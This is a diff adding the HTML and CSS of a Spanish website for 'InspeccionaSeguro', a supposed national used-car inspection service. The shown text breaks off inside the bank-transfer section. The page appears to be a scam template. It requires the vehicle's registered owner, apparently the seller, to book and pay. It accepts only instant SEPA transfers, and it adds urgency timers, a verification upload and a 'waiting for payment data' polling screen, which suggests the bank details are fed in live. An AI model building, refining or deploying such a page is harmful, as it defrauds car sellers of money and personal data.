@@ -1,0 +1,1770 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inspección Precompra de Coches | Inspección de Vehículos | InspeccionaSeguro</title>
+    <meta name="description"
+        content="La mayor red nacional de inspección de coches usados. Ofrecemos inspecciones profesionales de coches precompra in situ.">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=Oxygen:wght@300;400;700&display=swap"
+        rel="stylesheet">
+
+    <!-- Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- RESET & VARIABLES --- */
+        :root {
+            --primary-yellow: #E3BC38;
+            --primary-yellow-hover: #d4ae2f;
+            --text-dark: #3C3F48;
+            --text-light: #666;
+            --bg-light: #F9F9F9;
+            --white: #FFFFFF;
+            --border-color: #ddd;
+            --font-heading: 'Montserrat', sans-serif;
+            --font-body: 'Oxygen', sans-serif;
+            --container-width: 1200px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-body);
+            color: var(--text-dark);
+            line-height: 1.6;
+            background-color: var(--white);
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-family: var(--font-heading);
+            font-weight: 700;
+            margin-bottom: 1rem;
+            line-height: 1.2;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: color 0.3s;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .container {
+            max-width: var(--container-width);
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* --- BUTTONS --- */
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            font-family: var(--font-heading);
+            font-weight: 600;
+            text-transform: uppercase;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.3s, color 0.3s;
+            text-align: center;
+        }
+
+        .btn-yellow {
+            background-color: var(--primary-yellow);
+            color: var(--text-dark);
+            border: none;
+        }
+
+        .btn-yellow:hover {
+            background-color: var(--primary-yellow-hover);
+        }
+
+        /* --- HEADER --- */
+        .top-bar {
+            background-color: #f5f5f5;
+            padding: 8px 0;
+            font-size: 0.85rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        .top-bar .container {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .top-bar a.bold-login {
+            font-weight: 700;
+        }
+
+        .main-header {
+            background-color: var(--white);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .main-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 80px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: var(--font-heading);
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: var(--text-dark);
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .logo svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--primary-yellow);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .nav-link {
+            font-family: var(--font-heading);
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+
+        .nav-link:hover {
+            color: var(--primary-yellow);
+        }
+
+        .nav-phone {
+            font-weight: 700;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .mobile-toggle {
+            display: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* --- HOME VIEW SPECIFIC --- */
+        .hero {
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?auto=format&fit=crop&w=1920&q=80') no-repeat center center/cover;
+            color: var(--white);
+            padding: 120px 0;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+            text-transform: uppercase;
+        }
+
+        .hero h2 {
+            font-family: var(--font-body);
+            font-weight: 300;
+            font-size: 1.4rem;
+            margin-bottom: 2rem;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .hero-btn {
+            font-size: 1.1rem;
+            padding: 15px 40px;
+        }
+
+        .coverage {
+            padding: 60px 0;
+            background-color: var(--bg-light);
+            text-align: center;
+        }
+
+        .map-placeholder {
+            max-width: 800px;
+            height: 400px;
+            background-color: #e5e5e5;
+            margin: 0 auto;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&w=1200&q=80');
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }
+
+        .map-overlay {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+            font-weight: 600;
+        }
+
+        .process {
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .process-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 50px;
+        }
+
+        .process-card {
+            padding: 20px;
+        }
+
+        .process-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #fff;
+            border: 2px solid var(--primary-yellow);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2rem;
+            color: var(--text-dark);
+        }
+
+        .services {
+            padding: 80px 0;
+            background-color: #f4f4f4;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .service-card {
+            background-color: var(--white);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s;
+        }
+
+        .service-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .service-img {
+            height: 200px;
+            background-color: #ccc;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .service-content {
+            padding: 25px;
+        }
+
+        .service-list {
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: var(--text-light);
+        }
+
+        .service-list li {
+            margin-bottom: 5px;
+            padding-left: 15px;
+            position: relative;
+        }
+
+        .service-list li::before {
+            content: "•";
+            color: var(--primary-yellow);
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+
+        .service-price {
+            font-family: var(--font-heading);
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .testimonials {
+            padding: 80px 0;
+            text-align: center;
+            background-color: var(--text-dark);
+            color: var(--white);
+        }
+
+        .testimonial-box {
+            max-width: 800px;
+            margin: 0 auto;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px;
+            border-radius: 8px;
+        }
+
+        .stars {
+            color: var(--primary-yellow);
+            margin-bottom: 15px;
+        }
+
+        /* --- ORDER FORM VIEW SPECIFIC --- */
+        #order-view {
+            padding: 60px 0;
+            background-color: var(--bg-light);
+        }
+
+        .order-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: var(--white);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .order-header {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .form-section {
+            margin-bottom: 40px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 30px;
+        }
+
+        .form-section:last-child {
+            border-bottom: none;
+        }
+
+        .form-section h3 {
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group.full-width {
+            grid-column: span 2;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-family: var(--font-body);
+            font-size: 1rem;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-yellow);
+        }
+
+        .required {
+            color: red;
+        }
+
+        .checklist-group {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 4px;
+            border: 1px solid #eee;
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .checklist-item input[type="checkbox"] {
+            width: auto;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            background-color: #2b2e35;
+            color: #ccc;
+            padding: 60px 0 20px;
+            font-size: 0.9rem;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer h4 {
+            color: var(--white);
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            font-size: 1rem;
+        }
+
+        .footer-links li {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary-yellow);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+            text-align: center;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .mobile-toggle {
+                display: block;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .top-bar .container {
+                justify-content: center;
+                font-size: 0.75rem;
+            }
+
+            .logo {
+                font-size: 1.1rem;
+                gap: 5px;
+            }
+
+            .logo svg {
+                width: 30px;
+                height: 30px;
+            }
+
+            .hero {
+                padding: 80px 0;
+            }
+
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+
+            .process-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .form-group.full-width {
+                grid-column: span 1;
+            }
+
+            .bank-grid {
+                grid-template-columns: 1fr 1fr !important;
+                font-size: 0.85rem;
+                gap: 10px !important;
+            }
+        }
+
+        /* --- ATTENTION BOX --- */
+        .attention-box {
+            border: 2px solid #ff4d4d;
+            background-color: #fff8f8;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            box-shadow: 0 4px 10px rgba(255, 77, 77, 0.1);
+        }
+
+        .attention-icon {
+            width: 50px;
+            height: 50px;
+            background-color: #ff4d4d;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            flex-shrink: 0;
+            animation: pulse-red 2s infinite;
+        }
+
+        @keyframes pulse-red {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 77, 77, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 10px rgba(255, 77, 77, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 77, 77, 0);
+            }
+        }
+
+        .attention-text {
+            color: #d32f2f;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        /* --- BANK DETAILS VIEW --- */
+        .bank-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: var(--white);
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .bank-details-box {
+            background-color: var(--white);
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .bank-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .sepa-warning {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 5px solid #ffeeba;
+            font-weight: 600;
+        }
+
+        .timer-box {
+            text-align: center;
+            margin: 30px 0;
+            padding: 20px;
+            background-color: #2b2e35;
+            color: white;
+            border-radius: 8px;
+        }
+
+        .timer-display {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--primary-yellow);
+            font-family: monospace;
+        }
+
+        .verification-box {
+            border-top: 2px solid #eee;
+            padding-top: 30px;
+            margin-top: 30px;
+        }
+
+        .file-upload-wrapper {
+            border: 2px dashed #ccc;
+            padding: 30px;
+            text-align: center;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+
+        .file-upload-wrapper:hover {
+            border-color: var(--primary-yellow);
+        }
+
+        /* --- SUCCESS VIEW --- */
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 3rem;
+            margin: 0 auto 30px;
+        }
+
+        /* --- LOADER --- */
+        #loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-yellow);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            font-family: var(--font-heading);
+            font-weight: 600;
+            color: var(--text-dark);
+            font-size: 1.1rem;
+        }
+
+        /* --- POLLING STATUS INDICATOR --- */
+        .polling-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #666;
+        }
+
+        .polling-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #4CAF50;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%,
+            50% {
+                opacity: 1;
+            }
+
+            51%,
+            100% {
+                opacity: 0.3;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- LOADER OVERLAY -->
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Procesando... Por favor espere</div>
+    </div>
+
+    <!-- TOP BAR -->
+    <div class="top-bar">
+        <div class="container">
+            <a href="#">Conviértete en Inspector</a>
+            <button onclick="transitionTo('order-view')" class="btn-yellow"
+                style="padding: 4px 12px; font-size: 0.8rem; border: none; cursor:pointer;">Ordenar Inspección</button>
+            <a href="#" class="bold-login" style="margin-left: 20px;">Iniciar Sesión</a>
+        </div>
+    </div>
+
+    <!-- MAIN HEADER -->
+    <header class="main-header">
+        <div class="container main-nav">
+            <a href="#" class="logo" onclick="transitionTo('home-view')">
+                <svg viewBox="0 0 512 512">
+                    <path d="M256,0C114.6,0,0,114.6,0,256s114.6,256,256,256s256-114.6,256-256S397.4,0,256,0z"
+                        fill="#E3BC38" />
+                    <path
+                        d="M256,50c-13,0-25,5-35,13L110,165c-20,18-20,48,0,66l111,102c10,9,22,14,35,14s25-5,35-14l111-102 c20-18,20-48,0-66L291,63C281,55,269,50,256,50z"
+                        fill="#FFF" />
+                </svg>
+                INSPECCIONASEGURO
+            </a>
+
+            <nav class="nav-links">
+                <a onclick="transitionTo('home-view')" class="nav-link">Inicio</a>
+                <a onclick="transitionTo('home-view')" class="nav-link">Inspecciones</a>
+                <a onclick="transitionTo('order-view')" class="nav-link">Ordenar</a>
+                <a href="#" class="nav-link">Preguntas Frecuentes</a>
+                <a href="#" class="nav-link">Corporativo</a>
+                <a href="#" class="nav-link">Contacto</a>
+            </nav>
+
+            <div class="nav-phone">
+                <i class="fa-solid fa-phone"></i>
+                (888) 231-0000
+            </div>
+
+            <div class="mobile-toggle">
+                <i class="fa-solid fa-bars"></i>
+            </div>
+        </div>
+    </header>
+
+    <!-- HOME VIEW -->
+    <main id="home-view">
+        <!-- HERO SECTION -->
+        <section class="hero">
+            <div class="container">
+                <h1>La Mayor Red Nacional de Inspección de Coches Usados</h1>
+                <h2>Ofrecemos inspecciones profesionales de coches precompra in situ.</h2>
+                <button onclick="transitionTo('order-view')" class="btn btn-yellow hero-btn">Ordenar Inspección</button>
+            </div>
+        </section>
+
+        <!-- COVERAGE SECTION -->
+        <section class="coverage">
+            <div class="container">
+                <h2>Cubrimos Toda España</h2>
+                <p>No importa dónde vivas, o dónde esté tu nuevo coche: ¡tenemos un inspector en tu área listo para
+                    revisarlo! Incluso cubrimos las Islas Canarias y Baleares.</p>
+                <div class="map-placeholder">
+                    <div class="map-overlay">
+                        <i class="fa-solid fa-location-dot" style="color: var(--primary-yellow);"></i> Cobertura
+                        Nacional
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- PROCESS SECTION -->
+        <section class="process">
+            <div class="container">
+                <h2>¿Cuál es el Proceso de Inspección?</h2>
+                <div class="process-grid">
+                    <div class="process-card">
+                        <div class="process-icon"><i class="fa-solid fa-cart-shopping"></i></div>
+                        <h3>1. Ordenar</h3>
+                        <p>Realiza tu pedido en línea o por teléfono.</p>
+                    </div>
+                    <div class="process-card">
+                        <div class="process-icon"><i class="fa-regular fa-calendar-check"></i></div>
+                        <h3>2. Programar</h3>
+                        <p>Coordinamos con el vendedor para programar la inspección.</p>
+                    </div>
+                    <div class="process-card">
+                        <div class="process-icon"><i class="fa-solid fa-magnifying-glass-car"></i></div>
+                        <h3>3. Inspeccionar</h3>
+                        <p>Nuestro inspector certificado realiza una revisión exhaustiva.</p>
+                    </div>
+                    <div class="process-card">
+                        <div class="process-icon"><i class="fa-solid fa-file-contract"></i></div>
+                        <h3>4. Informe</h3>
+                        <p>Recibes un informe detallado con fotos inmediatamente.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SERVICES SECTION -->
+        <section class="services">
+            <div class="container">
+                <div class="services-header">
+                    <h2>Inspecciones Móviles Precompra de Coches Usados</h2>
+                    <p>Elige la inspección que se adapte a tus necesidades.</p>
+                </div>
+
+                <div class="services-grid">
+                    <!-- Standard -->
+                    <div class="service-card">
+                        <div class="service-img"
+                            style="background-image: url('https://images.unsplash.com/photo-1542282088-fe8426682b8f?auto=format&fit=crop&w=600&q=80')">
+                        </div>
+                        <div class="service-content">
+                            <h3>Estándar</h3>
+                            <ul class="service-list">
+                                <li>Para coches más nuevos de 20 años</li>
+                                <li>Revisión mecánica completa</li>
+                                <li>Prueba de carretera incluida</li>
+                                <li>25+ Fotos</li>
+                            </ul>
+                            <span class="service-price">Desde €475</span>
+                            <button onclick="showOrderForm()" class="btn btn-yellow" style="width: 100%">Ordenar
+                                Ahora</button>
+                        </div>
+                    </div>
+
+                    <!-- Exotic -->
+                    <div class="service-card">
+                        <div class="service-img"
+                            style="background-image: url('https://images.unsplash.com/photo-1566008885218-90abf9200ddb?auto=format&fit=crop&w=600&q=80')">
+                        </div>
+                        <div class="service-content">
+                            <h3>Exótico</h3>
+                            <ul class="service-list">
+                                <li>Vehículos de alta gama (Porsche, etc.)</li>
+                                <li>Inspección detallada del tren motriz</li>
+                                <li>Diagnóstico por computadora</li>
+                                <li>40+ Fotos</li>
+                            </ul>
+                            <span class="service-price">Desde €980</span>
+                            <button onclick="showOrderForm()" class="btn btn-yellow" style="width: 100%">Ordenar
+                                Ahora</button>
+                        </div>
+                    </div>
+
+                    <!-- Classic -->
+                    <div class="service-card">
+                        <div class="service-img" style="background-image: url('classic-car.png')">
+                        </div>
+                        <div class="service-content">
+                            <h3>Clásico</h3>
+                            <ul class="service-list">
+                                <li>Vehículos de 20 años o más</li>
+                                <li>Revisión de óxido y carrocería</li>
+                                <li>Énfasis en deterioro por edad</li>
+                                <li>40+ Fotos</li>
+                            </ul>
+                            <span class="service-price">Desde €625</span>
+                            <button onclick="showOrderForm()" class="btn btn-yellow" style="width: 100%">Ordenar
+                                Ahora</button>
+                        </div>
+                    </div>
+
+                    <!-- RV -->
+                    <div class="service-card">
+                        <div class="service-img"
+                            style="background-image: url('https://images.unsplash.com/photo-1523987355523-c7b5b0dd90a7?auto=format&fit=crop&w=600&q=80')">
+                        </div>
+                        <div class="service-content">
+                            <h3>Autocaravana / Motorhome</h3>
+                            <ul class="service-list">
+                                <li>Revisión mecánica + electrodomésticos</li>
+                                <li>Sistemas de agua y gas</li>
+                                <li>Habitáculos extensibles y gatos</li>
+                                <li>40+ Fotos</li>
+                            </ul>
+                            <span class="service-price">Desde €750</span>
+                            <button onclick="showOrderForm()" class="btn btn-yellow" style="width: 100%">Ordenar
+                                Ahora</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- TESTIMONIALS -->
+        <section class="testimonials">
+            <div class="container">
+                <h2>Opiniones de Clientes</h2>
+                <br>
+                <div class="testimonial-box">
+                    <div class="stars">
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                        <i class="fa-solid fa-star"></i>
+                    </div>
+                    <p>"¡El inspector fue extremadamente minucioso y me salvó de comprar un coche con problemas! El
+                        informe fue fácil de leer y las fotos eran excelentes. Servicio muy recomendable."</p>
+                    <br>
+                    <strong>- María S.</strong>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- ORDER FORM VIEW (Hidden by default) -->
+    <main id="order-view" style="display: none;">
+        <div class="container">
+            <div class="order-container">
+                <div class="order-header">
+                    <h2>Solicitud de Inspección de Vehículo</h2>
+                    <p>Complete el formulario a continuación para ordenar su inspección.</p>
+                </div>
+
+                <div class="attention-box">
+                    <div class="attention-icon">
+                        <i class="fa-solid fa-triangle-exclamation"></i>
+                    </div>
+                    <div class="attention-text">
+                        IMPORTANTE: Solo el propietario registrado del vehículo puede reservar la cita de inspección, ya
+                        que esto nos permitirá la verificación y el pago.
+                    </div>
+                </div>
+
+                <form onsubmit="event.preventDefault(); showBankView();">
+
+                    <!-- 1. VEHICLE INFO -->
+                    <div class="form-section">
+                        <h3>1. Información del Vehículo</h3>
+                        <div class="form-grid">
+                            <div class="form-group full-width">
+                                <label>Tipo de Inspección <span class="required">*</span></label>
+                                <select required>
+                                    <option value="">Seleccionar Tipo de Inspección</option>
+                                    <option value="standard">Estándar (Menos de 20 años) - €475</option>
+                                    <option value="classic">Clásico (20 años o más) - €625</option>
+                                    <option value="exotic">Exótico / Lujo - €980</option>
+                                    <option value="commercial">Comercial - €550</option>
+                                    <option value="rv">Autocaravana / Motorhome - €750</option>
+                                    <option value="motorcycle">Motocicleta - €250</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label>Año <span class="required">*</span></label>
+                                <input type="number" placeholder="Ej. 2018" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Marca <span class="required">*</span></label>
+                                <input type="text" placeholder="Ej. Ford" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Modelo <span class="required">*</span></label>
+                                <input type="text" placeholder="Ej. Mustang" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Número de Bastidor (Opcional)</label>
+                                <input type="text" placeholder="Número de Identificación del Vehículo">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-section">
+                        <h3>2. Ubicación y fecha/hora de la cita</h3>
+                        <div class="form-grid">
+                            <div class="form-group full-width">
+                                <label>Dirección del vehículo <span class="required">*</span></label>
+                                <input type="text" placeholder="Calle, Ciudad, Provincia, Código Postal" required>
+                            </div>
+                            <div class="form-group full-width">
+                                <label>Fecha y hora <span class="required">*</span></label>
+                                <div style="display: flex; gap: 10px;">
+                                    <div style="position: relative; flex: 1;">
+                                        <i class="fa-regular fa-calendar"
+                                            style="position: absolute; left: 10px; top: 12px; color: #888;"></i>
+                                        <input type="date" required style="padding-left: 35px; width: 100%;">
+                                    </div>
+                                    <select required style="flex: 1;">
+                                        <option value="">Seleccionar Hora</option>
+                                        <option>09:00 AM</option>
+                                        <option>10:00 AM</option>
+                                        <option>11:00 AM</option>
+                                        <option>12:00 PM</option>
+                                        <option>01:00 PM</option>
+                                        <option>02:00 PM</option>
+                                        <option>03:00 PM</option>
+                                        <option>04:00 PM</option>
+                                        <option>05:00 PM</option>
+                                    </select>
+                                </div>
+                            </div>
+                            <div class="form-group full-width">
+                                <label>Número de teléfono <span class="required">*</span></label>
+                                <input type="tel" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 3. ADD-ONS -->
+                    <div class="form-section">
+                        <h3>3. Servicios Adicionales</h3>
+                        <div class="checklist-group">
+                            <div class="checklist-item">
+                                <input type="checkbox" id="carfax" onchange="calculateTotal()">
+                                <label for="carfax">Informe de Historial del Vehículo CARFAX (+€35.00)</label>
+                            </div>
+                            <div class="checklist-item">
+                                <input type="checkbox" id="verbal" onchange="calculateTotal()">
+                                <label for="verbal">Informe Verbal de Evaluación del Vehículo (+€50.00)</label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 4. BUYER INFO -->
+                    <div class="form-section">
+                        <h3>4. Datos de contacto del propietario registrado</h3>
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label>Nombre <span class="required">*</span></label>
+                                <input type="text" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Apellidos <span class="required">*</span></label>
+                                <input type="text" required>
+                            </div>
+                            <div class="form-group full-width">
+                                <label>Correo Electrónico <span class="required">*</span></label>
+                                <input type="email" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Teléfono <span class="required">*</span></label>
+                                <input type="tel" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 5. INSPECTION DETAILS -->
+                    <div class="form-section">
+                        <h3>5. Detalles de la Inspección & Precio</h3>
+                        <div style="background: #fdfdfd; padding: 20px; border: 1px solid #eee; border-radius: 8px;">
+                            <div
+                                style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
+                                <div>
+                                    <h4 style="margin: 0; color: var(--text-dark);">Precio Total</h4>
+                                    <p style="font-size: 0.9rem; color: #666; margin-top: 5px;">Paquete de Inspección
+                                        Completa</p>
+                                </div>
+                                <div id="total-price-display"
+                                    style="font-size: 2rem; font-weight: 700; color: var(--text-dark);">€0.00</div>
+                            </div>
+                            <div>
+                                <h5 style="font-size: 0.95rem; margin-bottom: 10px;">Qué está incluído:</h5>
+                                <ul style="margin-left: 20px; font-size: 0.9rem; line-height: 1.8;">
+                                    <li style="list-style-type: disc;">Revisión Mecánica & Eléctrica Completa</li>
+                                    <li style="list-style-type: disc;">Diagnóstico por Computadora & Escáner OBDII</li>
+                                    <li style="list-style-type: disc;">Inspección de Chasis, Óxido & Carrocería</li>
+                                    <li style="list-style-type: disc;">Prueba de Carretera & Análisis de Fluidos</li>
+                                    <li style="list-style-type: disc;">70+ Fotos de Alta Resolución</li>
+                                    <li style="list-style-type: disc;">Informe Detallado del Estado entregado por Correo
+                                        Electrónico</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="form-group full-width" style="margin-top: 20px;">
+                            <div class="checklist-item">
+                                <input type="checkbox" id="terms" required>
+                                <label for="terms">Acepto los Términos y Condiciones <span
+                                        class="required">*</span></label>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 30px;">
+                        <button type="button" onclick="showHome()" class="btn btn-outline"
+                            style="border-color: #ddd; color: #333; margin-right: 15px;">Cancelar</button>
+                        <button type="submit" class="btn btn-yellow" style="min-width: 200px;">Realizar Pedido</button>
+                    </div>
+
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- BANK & VERIFICATION VIEW (Hidden by default) -->
+    <main id="bank-view" style="display: none;">
+        <div class="container">
+            <div class="bank-container">
+                <div class="order-header">
+                    <h2>Pago & Verificación</h2>
+                    <p>Complete su pago para finalizar la reserva.</p>
+                </div>
+
+                <div class="sepa-warning">
+                    <i class="fa-solid fa-triangle-exclamation"></i>
+                    AVISO: Solo aceptamos transferencias SEPA INSTANTÁNEAS para confirmación inmediata. Las
+                    transferencias regulares pueden resultar en retrasos o cancelación de la cita.
+                </div>
+
+                <!-- WAITING UI -->
+                <div id="waiting-ui" style="text-align: center; padding: 40px; display: none;">
+                    <div style="font-size: 3rem; color: var(--primary-yellow); margin-bottom: 20px;">
+                        <i class="fa-solid fa-spinner fa-spin"></i>
+                    </div>
+                    <h3 style="color: var(--text-dark); margin-bottom: 10px;">Conectando al Sistema de Pago...</h3>
+                    <p style="color: #666; font-size: 1.1rem;">Por favor espere mientras preparamos sus datos de pago
+                        seguros.</p>
+                    <div class="polling-status">
+                        <div class="polling-dot"></div>
+                        <span id="polling-status-text">Esperando datos de pago...</span>
+                    </div>
+                    <p style="color: #999; font-size: 0.85rem; margin-top: 15px;" id="poll-count-display">Verificando...
+                        (0 intentos)</p>
+                </div>
+
+                <div id="bank-details-box" class="bank-details-box">
+                    <h3 style="margin-bottom: 20px; color: var(--text-dark);">Datos de Transferencia Bancaria (SEPA)
+                    </h3>
+                    <div class="bank-grid">
